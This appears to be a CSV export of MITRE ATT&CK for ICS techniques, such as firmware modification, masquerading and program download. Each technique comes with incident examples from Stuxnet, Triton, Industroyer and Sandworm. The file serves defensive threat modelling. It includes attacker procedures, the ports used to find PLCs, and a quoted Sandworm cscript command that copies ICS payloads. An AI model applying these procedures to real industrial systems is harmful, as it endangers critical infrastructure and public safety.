T0857,System Firmware,"System firmware on modern assets is often designed with an update feature. Older device firmware may be factory installed and require special reprograming equipment. When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades. Device firmware updates are often delegated to the user and may be done using a software update package. It may also be possible to perform this task over the network.   An adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware. Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers. ","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. ', '[Triton] is able to read, write and execute code in memory on the safety controller at an arbitrary address within the devices firmware region. This allows the malware to make changes to the running firmware in memory and  modify how the device operates. ', 'In the Ukraine 2015 Incident, [Sandworm Team] developed and used malicious firmware to render communication devices inoperable. ']",False
T0849,Masquerading,"Adversaries may use masquerading to disguise a malicious application or executable as another file, to avoid operator and engineer suspicion. Possible disguises of these masquerading files can include commonly found programs, expected vendor executables and configuration files, and other commonplace application and naming conventions. By impersonating expected and vendor-relevant files and applications, operators and engineers may not notice the presence of the underlying malicious content and possibly end up running those masquerading as legitimate functions.   Applications and other files commonly found on Windows systems or in engineering workstations have been impersonated before. This can be as simple as renaming a file to effectively disguise it in the ICS environment.","['[Stuxnet] renames s7otbxdx.dll, a dll responsible for handling communications with a PLC. It replaces this dll file with its own version that allows it to intercept any calls that are made to access the PLC. ', '[Triton] injector, inject.bin, masquerades as a standard compiled PowerPC program for the Tricon.   [Triton] was configured to masquerade as trilog.exe, which is the Triconex software for analyzing SIS logs.', '[REvil] searches for whether the Ahnlab autoup.exe service is running on the target system and injects its payload into this existing process. ', '[EKANS] masquerades itself as a valid executable with the filename update.exe. Many valid programs use the process name update.exe to perform background software updates. ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking.', '[Sandworm Team] transfers executable files as .txt. and then renames them to .exe, likely to avoid detection through extension tracking. ', '[Triton] was configured to masquerade as trilog.exe, which is the Triconex software for analyzing SIS logs. ']",False
T0843,Program Download,"Adversaries may perform a program download to transfer a user program to a controller.   Variations of program download, such as online edit and program append, allow a controller to continue running during the transfer and reconfiguration process without interruption to process control. However, before starting a full program download (i.e., download all) a controller may need to go into a stop state. This can have negative consequences on the physical process, especially if the controller is not able to fulfill a time-sensitive action. Adversaries may choose to avoid a download all in favor of an online edit or program append to avoid disrupting the physical process. An adversary may need to use the technique Detect Operating Mode or Change Operating Mode to make sure the controller is in the proper mode to accept a program download.  The granularity of control to transfer a user program in whole or parts is dictated by the management protocol (e.g., S7CommPlus, TriStation) and underlying controller API. Thus, program download is a high-level term for the suite of vendor-specific API calls used to configure a controllers user program memory space.    [Modify Controller Tasking] and [Modify Program] represent the configuration changes that are transferred to a controller via a program download.","['[Triton] leveraged the TriStation protocol to download programs onto Triconex Safety Instrumented System. ', '[PLC-Blaster] utilizes the PLC communication and management API to load executable Program Organization Units. ', '[INCONTROLLER] can use the CODESYS protocol to download programs to Schneider PLCs.   [INCONTROLLER] can modified program logic on Omron PLCs using either the program download or backup transfer functions available through the HTTP server. ', '[Stuxnet] infection sequence consists of code blocks and data blocks that will be downloaded to the PLC to alter its behavior. ']",False
T0847,Replication Through Removable Media,"Adversaries may move onto systems, such as those separated from the enterprise network, by copying malware to removable media which is inserted into the control systems environment. The adversary may rely on unknowing trusted third parties, such as suppliers or contractors with access privileges, to introduce the removable media. This technique enables initial access to target devices that never connect to untrusted networks, but are physically accessible.       Operators of the German nuclear power plant, Gundremmingen, discovered malware on a facility computer not connected to the internet.   The malware included Conficker and W32.Ramnit, which were also found on eighteen removable disk drives in the facility.       The plant has since checked for infection and cleaned up more than 1,000 computers.  An ESET researcher commented that internet disconnection does not guarantee system safety from infection or payload execution. ","[""[Conficker] exploits Windows drive shares. Once it has infected a computer, [Conficker] automatically copies itself to all visible open drive shares on other computers inside the network.  Nuclear power plant officials suspect someone brought in [Conficker] by accident on a USB thumb drive, either from home or computers found in the power plant's facility. "", '[Stuxnet] was able to self-replicate by being spread through removable drives. A willing insider or unknown third party, such as a contractor, may have brought the removable media into the target environment.  The earliest version of Stuxnet relied on physical installation, infecting target systems when an infected configuration file carried by a USB stick was opened. ']",False
T0852,Screen Capture,"Adversaries may attempt to perform screen capture of devices in the control system environment. Screenshots may be taken of workstations, HMIs, or other devices that display environment-relevant process, device, reporting, alarm, or related data. These device displays may reveal information regarding the ICS process, layout, control, and related schematics. In particular, an HMI can provide a lot of important industrial process information.  Analysis of screen captures may provide the adversary with an understanding of intended operations and interactions between critical devices.","['[APT33] utilize backdoors capable of capturing screenshots once installed on a system. ', '[ALLANITE] has been identified to collect and distribute screenshots of ICS systems such as HMIs.  ', '[Dragonfly 2.0] has been reported to take screenshots of the GUI for ICS equipment, such as HMIs. ', '[Dragonfly] has been reported to take screenshots of the GUI for ICS equipment, such as HMIs.']",
T0891,Hardcoded Credentials,"Adversaries may leverage credentials that are hardcoded in software or firmware to gain an unauthorized interactive user session to an asset. Examples credentials that may be hardcoded in an asset include:  * Username/Passwords * Cryptographic keys/Certificates * API tokens  Unlike [Default Credentials] these credentials are built into the system in a way that they either cannot be changed by the asset owner, or may be infeasible to change because of the impact it would cause to the control system operation. These credentials may be reused across whole product lines or device models and are often not published or known to the owner and operators of the asset.   Adversaries may utilize these hardcoded credentials to move throughout the control system environment or provide reliable access for their tools to interact with industrial assets.  ","['[INCONTROLLER] can login to Omron PLCs using hardcoded credentials, which is documented in CVE-2022-34151. ', ""[Stuxnet] uses a hardcoded password in the WinCC software's database server as one of the mechanisms used to propagate to nearby systems. ""]",False
T0859,Valid Accounts,"Adversaries may steal the credentials of a specific user or service account using credential access techniques. In some cases, default credentials for control system devices may be publicly available. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems. Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network. Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way.   Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence.    The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator)  and possibly between the enterprise and operational technology environments. Adversaries may be able to leverage valid credentials from one system to gain access to another system.","['[ALLANITE] utilized credentials collected through phishing and watering hole attacks. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications.  ', '[INCONTROLLER]  can brute force password-based authentication to Schneider PLCs over  the CODESYS protocol (UDP port 1740).   [INCONTROLLER]  can perform brute force guessing of passwords to OPC UA servers using a predefined list of passwords. ', '[TEMP.Veles] used valid credentials when laterally moving through RDP jump boxes into the ICS environment. ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used valid accounts to laterally move through VPN connections and dual-homed systems.', '[BlackEnergy] utilizes valid user and administrator credentials, in addition to creating new administrator accounts to maintain presence.  ', '[OilRig] utilized stolen credentials to gain access to victim machines.', 'In the Ukraine 2015 Incident, [Sandworm Team] used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications. ', '[Dragonfly 2.0] leveraged compromised user credentials to access the targets networks and download tools from a remote server.  ', '[HEXANE] has used valid IT accounts to extend their spearphishing campaign within an organization. ', '[Dragonfly] leveraged compromised user credentials to access the targets networks and download tools from a remote server.']",False
T0890,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.    When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods. ","['[Triton] leverages a previously-unknown vulnerability affecting Tricon MP3008 firmware versions 10.010.4 allows an insecurely-written system call to be exploited to achieve an arbitrary 2-byte write primitive, which is then used to gain supervisor privileges. ', '[INCONTROLLER] has the ability to exploit a vulnerable Asrock driver (AsrDrv103.sys) using CVE-2020-15368 to load its own unsigned driver on the system.']",False
T0846,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques. Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used. ","[""The [Industroyer] IEC 61850 payload component has the ability to discover relevant devices in the infected host's network subnet by attempting to connect on port 102.  [Industroyer] contains an OPC DA module that enumerates all OPC servers using the `ICatInformation::EnumClassesOfCategories` method with `CATID_OPCDAServer20` category identifier and `IOPCServer::GetStatus` to identify the ones running."", '[Triton] uses a Python script that is capable of detecting Triconex controllers on the network by sending a specific UDP broadcast packet over port 1502. ', 'The [Backdoor.Oldrea] ICS malware plugin relies on Windows networking (WNet) to discover all the servers, including OPC servers, that are reachable by the compromised machine over the network. ', '[PLC-Blaster] scans the network to find other Siemens S7 PLC devices to infect. It locates these devices by checking for a service listening on TCP port 102. ', '[INCONTROLLER] can perform a UDP multicast scan of UDP port 27127 to identify Schneider PLCs that use that port for the NetManage protocol.  [INCONTROLLER] can use the FINS (Factory Interface Network Service) protocol to scan for and obtain MAC address associated with Omron devices.  [INCONTROLLER] has the ability to perform scans for TCP port 4840 to identify devices running OPC UA servers.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] remotely discovered operational assets once on the OT network.  ', '[Stuxnet] scanned the network to identify the Siemens PLCs that it was targeting.']",False
T0818,Engineering Workstation Compromise,"Adversaries will compromise and gain control of an engineering workstation for Initial Access into the control system environment. Access to an engineering workstation may occur through or physical means, such as a Valid Accounts with privileged access or infection by removable media. A dual-homed engineering workstation may allow the adversary access into multiple networks. For example, unsegregated process control, safety system, or information system networks. An Engineering Workstation is designed as a reliable computing platform that configures, maintains, and diagnoses control system equipment and applications. Compromise of an engineering workstation may provide access to, and control of, other control system applications and equipment. In the Maroochy attack, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.","['[Stuxnet] utilized an engineering workstation as the initial access point for PLC devices.', '[Triton] malware gained remote access to an SIS engineering workstation.']",
T0884,Connection Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.  The definition of a proxy can also be expanded to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.  The network may be within a single organization or across multiple organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. ","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] established an internal proxy prior to the installation of backdoors within the network. ', 'The [INCONTROLLER] PLCProxy module can add an IP route to the CODESYS gateway running on Schneider PLCs to allow it to route messages through the PLC to other devices on that network. This allows the malware to bypass firewall rules that prevent it from directly communicating with devices on the same network as the PLC.', '[Industroyer] attempts to connect with a hardcoded internal proxy on TCP 3128 [default Squid proxy]. If established, the backdoor attempts to reach an external C2 server via the internal proxy. ', '[Sandworm Team] establishes an internal proxy prior to the installation of backdoors within the network. ']",False
T0869,Standard Application Layer Protocol,"Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus. These protocols may be used to disguise adversary actions as benign network traffic. Standard protocols may be seen on their associated port or in some cases over a non-standard port.  Adversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.","['[INCONTROLLER] can remotely send commands to a malicious agent uploaded on Omron PLCs over HTTP or HTTPS. ', '[BlackEnergy] uses HTTP POST request to contact external command and control servers.  ', '[Stuxnet] uses a thread to monitor a data block DB890 of sequence A or B. This thread is constantly running and probing this block (every 5 minutes). On an infected PLC, if block DB890 is found and contains a special magic value (used by Stuxnet to identify his own block DB890), this blocks data can be read and written. This thread is likely used to optimize the way sequences A and B work, and modify their behavior when the Step7 editor is opened. ', '[REvil] sends HTTPS POST messages with randomly generated URLs to communicate with a remote server.  ', '[OilRig] communicated with its command and control using HTTP requests. ', ""[Triton] can communicate with the implant utilizing the TriStation 'get main processor diagnostic data' command and looks for a specifically crafted packet body from which it extracts a command value and its arguments. "", '[HEXANE] communicated with command and control over HTTP and DNS. ']",
T0833,Modify Control Logic,"Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates.   Program code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.  An adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.  An adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device.   It is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the “real” pressure is for given analog signals and then automatically linearize the measurement to what would be the “real” pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be “corrected” during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising.   In the Maroochy Attack, Vitek Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. ","['[Triton] can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive. Triton also can reprogram the SIS logic to allow unsafe conditions to persist.The Triton malware is able to add a malicious program to the execution table of the controller. This action leaves the legitimate programs in place. If the controller failed, Triton would attempt to return it to a running state. If the controller did not recover within a certain time window, the sample would overwrite the malicious program to cover its tracks.']",
T0886,Remote Services,"Adversaries may leverage remote services to move between assets and network segments. These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms.      Remote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions. Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations. An adversary may use this technique to access devices which may be dual-homed  to multiple network segments, and can be used for [Program Download] or to execute attacks on control devices directly through [Valid Accounts]  Specific remote services (RDP & VNC) may be a precursor to enable [Graphical User Interface] execution on devices such as HMIs or engineering workstation software.  Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks.  ","['[INCONTROLLER] can use the CODESYS protocol to remotely connect to Schneider PLCs and perform maintenance functions on the device.  [INCONTROLLER] can use Telnet to upload payloads and execute commands on Omron PLCs.\t The malware can also use HTTP-based CGI scripts (e.g., cpu.fcgi, ecat.fcgi) to gain administrative access to the device. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network.', '[TEMP.Veles] utilized remote desktop protocol (RDP) jump boxes to move into the ICS environment. ', '[REvil] uses the SMB protocol to encrypt files located on remotely connected file shares. ', '[Stuxnet] executes malicious SQL commands in the WinCC database server to propagate to remote systems. The malicious SQL commands include xp_cmdshell, sp_dumpdbilog, and sp_addextendedproc. ', 'During the [Oldsmar Treatment Plant Intrusion] the threat actors gained access to the system through remote access software, allowing for the use of the standard operator HMI interface.', '[Sandworm Team] appears to use MS-SQL access to a pivot machine, allowing code execution throughout the ICS network. ', '[Sandworm Team] appears to use MS-SQL access to a pivot machine, allowing code execution throughout the ICS network. ']",False
T0824,I/O Module Discovery,"Adversaries may use input/output (I/O) module discovery to gather key information about a control system device. An I/O module is a device that allows the control system device to either receive or send signals to other devices. These signals can be analog or digital, and may support a number of different protocols. Devices are often able to use attachable I/O modules to increase the number of inputs and outputs that it can utilize. An adversary with access to a device can use native device functions to enumerate I/O modules that are connected to the device. Information regarding the I/O modules can aid the adversary in understanding related control processes.","['[Stuxnet] enumerates and parses the System Data Blocks (SDB). [Stuxnet] must find an SDB with the DWORD at offset 50h equal to 0100CB2Ch. This specifies that the system uses the Profibus communications processor module CP 342-5. In addition, specific values are searched for and counted: 7050h and 9500h. 7050h is assigned to part number KFC750V3 which appears to be a frequency converter drive (also known as variable frequency drive) manufactured by Fararo Paya in Teheran, Iran. 9500h is assigned to Vacon NX frequency converter drives manufactured by Vacon based in Finland.']",
T0813,Denial of Control,"Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls. An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls. An affected process may still be operating during the period of control loss, but not necessarily in a desired state.     In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters. ","['During the [2015 Ukraine Electric Power Attack] [KillDisk] rendered devices that were necessary for remote recovery unusable, including at least one RTU. Additionally, [Sandworm Team] overwrote the firmware for serial-to-ethernet converters, denying operators control of the downstream devices. ', '[Industroyer] is able to block serial COM channels temporarily causing a denial of control. ', 'In the [Maroochy Water Breach] the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.']",False
T0838,Modify Alarm Settings,"Adversaries may modify alarm settings to prevent alerts that may inform operators of their presence or to prevent responses to dangerous and unintended scenarios. Reporting messages are a standard part of data acquisition in control systems. Reporting messages are used as a way to transmit system state information and acknowledgements that specific actions have occurred. These messages provide vital information for the management of a physical process, and keep operators, engineers, and administrators aware of the state of system devices and physical processes.   If an adversary is able to change the reporting settings, certain events could be prevented from being reported. This type of modification can also prevent operators or devices from performing actions to keep the system in a safe state. If critical reporting messages cannot trigger these actions then a [Impact] could occur.   In ICS environments, the adversary may have to use [Alarm Suppression] or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring.   Methods of suppression often rely on modification of alarm settings, such as modifying in memory code to fixed values or tampering with assembly level instruction code. ","['In the [Maroochy Water Breach] the adversary disabled alarms at four pumping stations, preventing notifications to the central computer.']",False
T0885,Commonly Used Port,"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection. They may use the protocol associated with the port, or a completely different protocol. They may use commonly open ports, such as the examples provided below.     * TCP:80 (HTTP)   * TCP:443 (HTTPS)   * TCP/UDP:53 (DNS)   * TCP:1024-4999 (OPC on XP/Win2k3)   * TCP:49152-65535 (OPC on Vista and later)   * TCP:23 (TELNET)   * UDP:161 (SNMP)   * TCP:502 (MODBUS)   * TCP:102 (S7comm/ISO-TSAP)   * TCP:20000 (DNP3)   * TCP:44818 (Ethernet/IP)","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used port 443 to communicate with their C2 servers. ', '[Triton] uses TriStations default UDP port, 1502, to communicate with devices. ', '[Stuxnet] attempts to contact command and control servers on port 80 to send basic information about the computer it has compromised. ', '[Dragonfly 2.0] communicated with command and control over TCP ports 445 and 139 or UDP 137 or 138. ', '[Dragonfly] communicated with command and control over TCP ports 445 and 139 or UDP 137 or 138.']",False
T0873,Project File Infection,"Adversaries may attempt to infect project files with malicious code. These project files may consist of objects, program organization units, variables such as tags, documentation, and other configurations needed for PLC programs to function.  Using built in functions of the engineering software, adversaries may be able to download an infected program to a PLC in the operating environment enabling further [Execution] and [Persistence] techniques.    Adversaries may export their own code into project files with conditions to execute at specific intervals.  Malicious programs allow adversaries control of all aspects of the process enabled by the PLC. Once the project file is downloaded to a PLC the workstation device may be disconnected with the infected project file still executing. ",['[Stuxnet] copies itself into Step 7 projects in such a way that it automatically executes when the Step 7 project is loaded. '],False
T0840,Network Connection Enumeration,"Adversaries may perform network connection enumeration to discover information about device communication patterns. If an adversary can inspect the state of a network connection with tools, such as Netstat, in conjunction with [System Firmware] then they can determine the role of certain devices on the network  . The adversary can also use [Network Sniffing] to watch network traffic for details about the source, destination, protocol, and content.","['[EKANS] performs a DNS lookup of an internal domain name associated with its target network to identify if it was deployed on the intended system. ', '[Industroyer] contains an IEC 61850 module that enumerates all connected network adapters to determine their TCP/IP subnet masks. ']",False
T0867,Lateral Tool Transfer,"Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation.  Copying of files may also be performed laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares.   In control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.","['[Stuxnet] sends an SQL statement that creates a table and inserts a binary value into the table. The binary value is a hex string representation of the main Stuxnet DLL as an executable file (formed using resource 210) and an updated configuration data block. ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: `cscript C:\\Backinfo\\ufn.vbs C:\\Backinfo\\101.dll C:\\Delta\\101.dll`', '[NotPetya] can move laterally through industrial networks by means of the SMB service. ', '[INCONTROLLER] can use a Telnet session to load a malware implant on Omron PLCs. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] moved their tools laterally within the ICS network. ', '[WannaCry] can move laterally through industrial networks by means of the SMB service. ', '[Bad Rabbit] can move laterally through industrial networks by means of the SMB service. ', '[Sandworm Team] used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:\\\\Backinfo\\\\ufn.vbs  C:\\\\Backinfo\\\\101.dll C:\\\\Delta\\\\101.dll ']",False
T0839,Module Firmware,"Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.     This technique is similar to [System Firmware] but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices.     An easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following:     * Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.   * Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.   * Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.    * A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.   * Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",[],False
T0883,Internet Accessible Device,"Adversaries may gain access into industrial environments through systems exposed directly to the internet for remote access rather than through [External Remote Services] Internet Accessible Devices are exposed to the internet unintentionally or intentionally without adequate protections. This may allow for adversaries to move directly into the control system network. Access onto these devices is accomplished without the use of exploits, these would be represented within the [Exploit Public-Facing Application] technique.  Adversaries may leverage built in functions for remote access which may not be protected or utilize minimal legacy protections that may be targeted.  These services may be discoverable through the use of online scanning tools.   In the case of the Bowman dam incident, adversaries leveraged access to the dam control network through a cellular modem. Access to the device was protected by password authentication, although the application was vulnerable to brute forcing.     In Trend Micros manufacturing deception operations adversaries were detected leveraging direct internet access to an ICS environment through the exposure of operational protocols such as Siemens S7, Omron FINS, and EtherNet/IP, in addition to misconfigured VNC access. ","[""[Sandworm] actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet.))""]",False
T0893,Data from Local System,"Adversaries may target and collect data from local system sources, such as file systems, configuration files, or local databases. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes.  Adversaries may do this using [Command-Line Interface] or [Scripting] techniques to interact with the file system to gather information. Adversaries may also use [Automated Collection] on the local system. ","['[Duqu] downloads additional modules for the collection of data from local systems. The modules are named: infostealer 1, infostealer 2 and reconnaissance. ', '[Flame] has built-in modules to gather information from compromised computers. ', '[ACAD/Medre.A] collects information related to the AutoCAD application. The worm collects AutoCAD (*.dwg) files with drawings from infected systems. ']",False
T0892,Change Credential,"Adversaries may modify software and device credentials to prevent operator and responder access. Depending on the device, the modification or addition of this password could prevent any device configuration actions from being accomplished and may require a factory reset or replacement of hardware. These credentials are often built-in features provided by the device vendors as a means to restrict access to management interfaces.  An adversary with access to valid or hardcoded credentials could change the credential to prevent future authorized device access. Change Credential may be especially damaging when paired with other techniques such as Modify Program, Data Destruction, or Modify Controller Tasking. In these cases, a device’s configuration may be destroyed or include malicious actions for the process environment, which cannot not be removed through normal device configuration actions.   Additionally, recovery of the device and original configuration may be difficult depending on the features provided by the device. In some cases, these passwords cannot be removed onsite and may require that the device be sent back to the vendor for additional recovery steps.   A chain of incidents occurred in Germany, where adversaries locked operators out of their building automation system (BAS) controllers by enabling a previously unset BCU key.   ",[],False
T0889,Modify Program,"Adversaries may modify or add a program on a controller to affect how it interacts with the physical process, peripheral devices and other hosts on the network. Modification to controller programs can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.   Program modification encompasses the addition and modification of instructions and logic contained in Program Organization Units (POU)   and similar programming elements found on controllers. This can include, for example, adding new functions to a controller, modifying the logic in existing functions and making new calls from one function to another.   Some programs may allow an adversary to interact directly with the native API of the controller to take advantage of obscure features or vulnerabilities.","['[PLC-Blaster] copies itself to various Program Organization Units (POU) on the target device.  The POUs include the Data Block, Function, and Function Block. ', '[Stuxnet] infects PLCs with different code depending on the characteristics of the target system. An infection sequence consists of code blocks and data blocks that will be downloaded to the PLC to alter its behavior. ']",False
